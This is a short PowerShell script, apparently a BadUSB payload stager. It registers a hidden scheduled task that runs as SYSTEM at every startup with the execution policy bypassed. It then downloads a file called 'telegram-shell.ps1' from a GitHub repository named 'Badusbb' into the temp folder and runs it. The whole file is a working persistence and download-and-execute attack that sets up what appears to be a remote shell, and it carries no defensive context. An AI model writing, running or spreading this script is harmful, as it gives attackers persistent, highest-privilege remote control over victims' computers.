$taskName = "Auto GitHub Script"
$scriptUrl = "https://raw.githubusercontent.com/Eikakka123/Badusbb/main/telegram-shell.ps1"
$scriptPath = "$env:TEMP\script.ps1"

# Function to check if the task already exists
function TaskExists {
    return Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
}

# First-time setup: Create the scheduled task if it doesn't exist
if (-not (TaskExists)) {
    Write-Host "Setting up auto-start task..."

    # Define the task action
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"

    # Define the trigger (at startup)
    $trigger = New-ScheduledTaskTrigger -AtStartup

    # Create the scheduled task
    Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -RunLevel Highest -User "SYSTEM" -Force

    Write-Host "Startup task created! The script will now auto-run after reboots."
}

# Download the latest script from GitHub
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath

# Execute the downloaded script
powershell.exe -ExecutionPolicy Bypass -File $scriptPath
